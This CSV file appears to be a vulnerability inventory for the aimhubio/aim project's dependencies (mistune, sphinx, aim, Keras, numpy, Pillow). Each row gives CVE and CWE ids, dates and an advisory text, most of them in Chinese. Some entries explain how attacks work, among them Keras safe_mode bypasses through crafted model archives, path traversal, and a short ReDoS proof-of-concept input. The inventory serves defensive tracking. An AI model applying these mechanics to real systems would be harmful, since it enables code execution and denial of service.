project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
aimhubio_aim,mistune,0.8.4,True,CVE-2022-34749,CWE-1333,2022-07-05,"mistune是Hsiaoming Yang个人开发者的一个快速而强大的 Python Markdown 解析器。
mistune 2.0.2及以前的版本存在安全漏洞，该漏洞源于其对内联标记的支持是通过使用正则表达式实现的，这可能会在某些边缘情况下涉及大量的回溯。",2,2
aimhubio_aim,sphinx,,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
aimhubio_aim,sphinx,,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
aimhubio_aim,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
aimhubio_aim,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
aimhubio_aim,aim,>=3.0.0,True,CVE-2021-43775,CWE-22,2021-11-23,"Aim是美国的一个易于使用和高性能的开源实验跟踪器。
Aim 3.1.0之前版本存在路径遍历漏洞，攻击者可利用该漏洞通过操纵引用具有点-点斜杠（../）序列及其变体的文件的变量，或通过使用绝对文件路径，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码或配置以及关键系统文件。",1,2
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6578,CWE-79,,Aim 是由 Aim 开源的一个易于使用和高性能的实验跟踪器，允许用户记录、搜索和比较 AI 实验。在 Aim 版本 3.19.3 中，由于在生成网页时对输入的不正确中和，导致出现跨站脚本 (XSS) 漏洞。该漏洞允许攻击者通过在日志中注入恶意脚本进行攻击，用户在查看日志标签时该恶意脚本将被执行。利用 `dangerouslySetInnerHTML` 函数，使得在 React 应用中生成的日志输出容易受到 XSS 攻击。,3,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-7760,CWE-352,,Aim 是美国 Aim 开源的一个易于使用和高性能的开源实验跟踪器。Aim 版本 3.22.0 存在跨站请求伪造（CSRF）漏洞，该漏洞由于过于宽松的 CORS 设置而产生，允许来自所有源的跨源请求。这使得针对跟踪服务器所有端点的 CSRF 攻击成为可能，且可以与其他现存的漏洞（如远程代码执行、拒绝服务和任意文件读写）链式利用。,3,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-51464,CWE-79,2025-07-22,Aimhubio Aim 是一个开源工具，专为数据科学和机器学习工程设计，帮助用户管理和跟踪实验、数据和模型。该工具的 3.28.0 版本中存在一个跨站脚本 (XSS) 漏洞。攻击者可以通过向 /api/reports 端点发送恶意的 Python 代码，利用 Pyodide 在查看报告时解释并执行未经过滤的代码，特别是通过 pyodide.code.run_js() 执行 JavaScript，而没有适当的输入校验和沙箱限制。Pyodide 是一个项目，允许在浏览器中运行 Python，通常用于动态数据处理和科学计算。,3,0
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6851,CWE-22,,Aim 是美国 Aim 开源的一个易于使用和高性能的开源实验跟踪器。在 Aim 3.22.0 版本中，LocalFileManager._cleanup 函数接受用户指定的 glob-pattern 来删除文件。该函数未验证匹配的文件是否在 LocalFileManager 管理的目录内，从而允许恶意构造的 glob-pattern 导致任意文件删除。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-8061,CWE-1088,,Aim是美国Aim开源的一个易于使用和高性能的开源实验跟踪器。Aim 3.23.0版本存在资源管理错误漏洞，源于某些请求外部服务器数据的方法未设置超时，导致服务器无限期等待响应。这可能引发拒绝服务，因为跟踪服务器在等待响应期间无法响应其他请求。该问题出现在`aim`跟踪服务器与外部资源通信时使用的客户端中，具体在`_run_read_instructions`方法及类似调用中未设置超时。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-12777,CWE-1088,,Aim是一个开源实验跟踪器，旨在提供易用性和高性能。版本3.25.0存在安全漏洞，该漏洞源于未为sshfs-client设置超时，导致跟踪服务器无响应。当请求连接到一个无响应的socket时，单线程的跟踪服务器会因为缺少超时设置卡住，导致长时间无法响应其他请求。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6483,CWE-23,,Aim是美国Aim开源的一个易于使用和高性能的开源实验跟踪器。Aim 3.19.3版本的`runs/delete-batch`接口存在安全漏洞，攻击者可以通过路径遍历实现任意文件或目录的删除。此接口在处理用户指定的运行名称时没有缓解路径遍历，可能导致敏感文件的意外删除，从而引发拒绝服务或数据丢失。,3,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6829,CWE-73,,Aim 是 aimhubio 开发的一个高性能开源实验跟踪器，用于跟踪机器学习实验和模型的性能。Aim 版本 3.19.3 存在一个安全漏洞，攻击者可以利用 `tarfile.extractall()` 函数将恶意构造的 tar 文件的内容提取到主机服务器的任意位置。攻击者可以控制 `repo.path` 和 `run_hash`，从而绕过目录存在性检查，将文件提取到意想不到的位置，可能会覆盖关键文件。这可能导致任意数据被写入远程跟踪服务器的任意位置，可用于进一步攻击，如在目标服务器上写入新的 SSH 密钥。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-12778,CWE-770,2025-03-20,aimhubio/aim 是一个用于跟踪和管理机器学习指标的开源工具。该漏洞影响版本 3.25.0，当通过 Aim 网页 API 同时检索大量被跟踪的指标时，可能导致 web 服务器无法响应。其根本原因在于缺乏对每次请求可以请求的指标数量的限制，加上服务器的单线程特性，导致资源消耗过大，最终阻塞服务器。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-2195,CWE-94,,Aim 是一个易于使用和高性能的开源实验跟踪器。该组件允许用户记录、搜索和比较人工智能实验。漏洞源于对 RunView 对象的用户访问控制不当，攻击者可以通过在 /api/runs/search/run/ 端点中操控 query 参数执行任意命令。具体而言，攻击者可以构造代码片段并通过 API 调用影响服务器的行为。,1,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6396,CWE-29,,Aim是一个易于使用的开源实验跟踪器，旨在记录、搜索和比较AI实验。Aim 3.19.3版本存在安全漏洞，该漏洞源自备份运行功能中的参数处理不当，允许攻击者利用 `run_hash` 和 `repo.path` 参数来覆盖主机服务器上的任意文件，并窃取任意数据。这一漏洞可以被滥用以导致服务拒绝，窃取私密数据，以及通过下载私密ssh密钥实现远程代码执行的可能性。,1,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-8238,CWE-1336,,Aim 是一个由 Aimhubio 开发的开源实验跟踪器，具有易于使用和高性能的特性。在 Aim 3.22.0 版本中，AimQL 查询语言使用了过时的 safer_getattr() 函数，未能保护 str.format_map() 方法，因此攻击者可以利用该漏洞泄露服务器端秘密，或获取任意代码执行的能力。该漏洞的根源在于 str.format_map() 方法可以读取任意 Python 对象的属性，攻击者可以访问敏感变量，例如 os.environ。如果攻击者能够向 Aim 服务器上的已知位置写入文件，他们可以利用 str.format_map() 加载恶意的 .dll/.so 文件到 Python 解释器中，从而导致不受限制的代码执行。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-2196,CWE-352,,Aim 是一个易于使用和高性能的开源实验跟踪器，旨在记录、搜索和比较人工智能实验。由于在 Aim 控制面板中缺乏 CSRF 和 CORS 保护，Aim 存在跨站请求伪造漏洞。攻击者可以通过欺骗用户执行恶意脚本，向 Aim 服务器发送未授权请求，从而导致数据丢失和未授权的数据操作，如删除运行记录和更新数据等。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-0190,CWE-1049,,在aimhubio/aim的3.25.0版本中存在一个拒绝服务漏洞。该组件是一个用于跟踪和管理机器学习实验的开源项目，允许用户通过Web API与跟踪的对象进行交互。漏洞的根本原因是对大量`Text`对象的跟踪，攻击者可以通过通过Web API同时查询这些对象，从而使Aim Web服务器在处理请求时对其他请求无响应，导致长时间停机。此漏洞可被恶意用户重复利用，造成完全的拒绝服务。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6227,CWE-835,,Aim 是一个开源的实验跟踪工具，致力于简化 AI 实验的记录和管理。第 3.19.3 版本存在资源管理错误漏洞，攻击者可以将远程跟踪服务器配置为指向自身，导致服务器进入无限连接循环，从而无法处理其他合法请求。这种配置错误使得服务器失去了响应能力，造成拒绝服务。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-0189,CWE-770,,aimhubio/aim 是一个用于跟踪和管理图像的开源项目。版本 3.25.0 的跟踪服务器存在拒绝服务漏洞。该漏洞的根本原因在于服务器对 websocket 消息的最大大小进行了重写，允许跟踪非常大的图像。这导致服务器在处理大图像期间对其他请求无响应，从而造成拒绝服务状态。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-8863,CWE-79,2024-09-14,"Aim是美国Aim开源的一个易于使用和高性能的开源实验跟踪器。
Aim 3.24版本及之前版本存在安全漏洞，该漏洞源于对参数 query 的错误操作会导致跨站点脚本攻击。",3,0
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-5321,CWE-264 CWE-265,2025-05-29,在aimhubio的aim版本3.29.1及之前的版本中，发现了一个被评估为关键级别的漏洞。这个漏洞影响了组件run_view Object Handler中的文件/aim/storage/query.py的RestrictedPythonQuery函数。对Query参数进行操作会导致沙箱问题。,3,0
aimhubio_aim,Keras,2.2.4,True,,CWE-502,2021-08-05,"## Overview
[keras](https://github.com/keras-team/keras) is a Keras is a high-level neural networks API for Python..

Affected versions of this package are vulnerable to Deserialization of Untrusted Data. Loading keras models via yaml could allow arbitrary code execution via unsafe deserialization.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.
  
## Remediation
Upgrade `keras` to version 2.6.0rc3 or higher.
## References
- [GitHub Release](https://github.com/keras-team/keras/releases/tag/v2.6.0-rc3)
",2,2
aimhubio_aim,Keras,2.2.4,True,CVE-2024-3660,CWE-94,2024-04-16,<p>TensorFlow Keras是TensorFlow开源的一个框架。为解决机器学习问题提供了一个可接近、高效的界面。 TensorFlow Keras 2.13之前版本存在安全漏洞，该漏洞源于存在任意代码注入漏洞，允许攻击者执行任意代码。</p>,1,1
aimhubio_aim,Keras,2.2.4,True,CVE-2025-8747,CWE-502,2025-08-11,Keras 是一个用于深度学习的高层神经网络 API，广泛应用于机器学习模型的构建和训练。其 `Model.load_model` 方法用于加载模型文件，支持从磁盘或其他存储位置导入预训练模型。漏洞存在于 Keras 版本 3.0.0 至 3.10.0 中的 `Model.load_model` 方法，该方法的安全模式存在绕过问题。攻击者可通过诱导用户加载特制的 `.keras` 模型文件，触发反序列化问题（CWE-502），从而执行任意代码。漏洞的成因在于组件未正确校验输入数据的可信性，导致恶意模型文件中的代码能够在加载过程中被执行。,2,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-9906,CWE-502,2025-09-19,Keras 是一个高层神经网络 API，用于搭建深度学习模型。其 Model.load_model 方法允许从存储的 .keras 模型文件中加载模型。该方法中存在一个漏洞，即使在 safe_mode=True 的情况下，攻击者也可通过特制的 .keras 模型文件实现任意代码执行。此漏洞的核心成因是 .keras 文件中的 config.json 文件可以调用 keras.config.enable_unsafe_deserialization() 方法来禁用安全模式。一旦禁用，攻击者即可利用 Keras 的 Lambda 层功能插入任意 Python 代码（以序列化形式存在）。触发条件是攻击者需要将 config.json 文件放在归档文件的第一位置，Lambda 层的恶意代码放在第二位置。,2,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-9905,CWE-913,2025-09-19,"Keras 是一个高层神经网络 API，通常用于构建深度学习模型。其 `Model.load_model` 方法支持加载 .h5/.hdf5 文件格式的模型，这是 Keras 3 提供的向后兼容的遗留功能。漏洞的根源在于，当使用 `safe_mode=True` 选项加载 .h5/.hdf5 文件时，Keras 未正确验证文件的安全性，从而允许攻击者通过构造特制的恶意 .h5/.hdf5 模型文件，实现任意代码执行。

此漏洞利用了 Keras 中的 Lambda 层特性，该特性支持任意 Python 代码的序列化（pickle）。攻击者可以在恶意文件中嵌入恶意的 Python 代码片段，该代码将在加载模型文件时被执行。尽管 `safe_mode=True` 的目的是防止不安全的 Lambda 反序列化，但该选项在处理 .h5/.hdf5 文件时被忽略，导致用户误认为加载是安全的。

从技术上来看，问题出在 Keras 的 `legacy_h5_format.load_model_from_hdf5` 实现中，该方法完全忽略了 `safe_mode` 参数的存在，并直接加载文件中的内容。此行为为攻击者提供了代码执行的入口。",2,-2
aimhubio_aim,Keras,2.2.4,True,CVE-2024-55459,CWE-494,2025-01-08,"Keras是Keras开源的一个多后端深度学习框架。
Keras 3.7.0版本存在安全漏洞，该漏洞源于允许攻击者通过get_file函数下载精心设计的tar文件，从而将任意文件写入用户的计算机。",3,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-1550,CWE-94,2025-03-11,"Keras 是一个用于构建和训练深度学习模型的高层神经网络 API。其 Model.load_model 函数的 safe_mode 功能原本设计为防止不安全的 lambda 反序列化，但存在漏洞。攻击者可以通过手动构造的恶意 .keras 存档，修改其中的 config.json 文件，在模型加载过程中指定任意 Python 模块及其函数和参数，从而实现任意代码执行。

漏洞的成因是 Keras 在加载模型时未对内部模块函数的调用进行充分验证，允许攻击者利用 Keras 内置函数（如 keras.utils.get_file）来执行恶意操作，例如下载远程文件并覆盖本地文件。即使 safe_mode 启用，该漏洞仍然可被利用，因为它依赖于对批准模块的滥用。

影响范围包括默认配置的 Keras 环境，且不需要用户输入，攻击者只需提供恶意模型文件即可触发漏洞。",2,1
aimhubio_aim,Keras,2.2.4,True,CVE-2025-12058,CWE-502,2025-10-29,Keras 是一个广泛使用的深度学习框架，主要用于构建和训练神经网络模型。Keras.Model.load_model 方法用于加载已保存的模型，包括特定格式的 .keras 存档文件。在深度学习开发中，该方法通常用于快速恢复训练模型或部署预训练模型。漏洞源于 StringLookup 层在模型加载过程中的处理方式。StringLookup 层的构造函数接受一个 vocabulary 参数，可以指定本地文件路径或远程文件路径。攻击者可以创建一个恶意的 .keras 文件，在其配置中嵌入本地文件路径，从而导致 Keras 在加载模型时尝试读取指定的本地文件内容并将其融入模型状态（例如通过 get_vocabulary() 方法检索）。此外，由于 Keras 使用 TensorFlow 的 tf.io.gfile 进行文件操作，该模块支持远程文件系统（如 GCS 和 HDFS）以及 HTTP/HTTPS 协议，这允许攻击者通过同样的机制从任意网络端点获取内容，从而实施 SSRF 攻击。漏洞的根本原因是 safe_mode=True 标志未能有效限制外部路径加载功能，导致意外的数据访问风险。,3,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-12060,CWE-22,2025-10-30,"Keras 是一个广泛使用的高级框架，用于构建和训练深度学习模型。其 utils.get_file API 提供了从 URL 下载文件的功能，并支持自动解压文件。当使用 extract=True 参数解压 tar 格式文件时，该功能存在路径遍历漏洞。具体来说，工具函数调用了 Python 的 tarfile.extractall 方法，但没有启用关键的过滤功能（filter=""data""）。这使攻击者可以通过构造恶意的 tar 存档（包含特殊符号链接），实现任意文件写入到文件系统中的任意路径。该漏洞的根本原因是缺乏对解压文件路径的校验，结合 Python tarfile 模块中的已知缺陷（CVE-2025-4517），攻击者能够利用这一漏洞。即便升级 Python 到修复版本（例如 Python 3.13.4），仍需升级 Keras 到安全版本（Keras 3.12）才能彻底解决问题。",2,2
aimhubio_aim,numpy,1.21.0,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
aimhubio_aim,numpy,1.21.0,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
aimhubio_aim,Pillow,>=7.1.0,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
aimhubio_aim,Pillow,>=7.1.0,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
aimhubio_aim,Pillow,>=7.1.0,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-30595,CWE-787,2022-05-17,"Pillow是一款基于Python的图像处理库。
Pillow 9.1.0 版本存在安全漏洞，该漏洞源于在处理TGA文件时存在边界错误。远程攻击者利用该漏洞可以将专门设计的数据传递给应用程序，触发基于堆的缓冲区溢出，并在目标系统上执行任意代码。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25292,CWE-1333,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于PDF解析器允许通过一个特制的PDF文件进行正则表达式DoS（ReDoS）攻击。",3,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
aimhubio_aim,Pillow,>=7.1.0,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
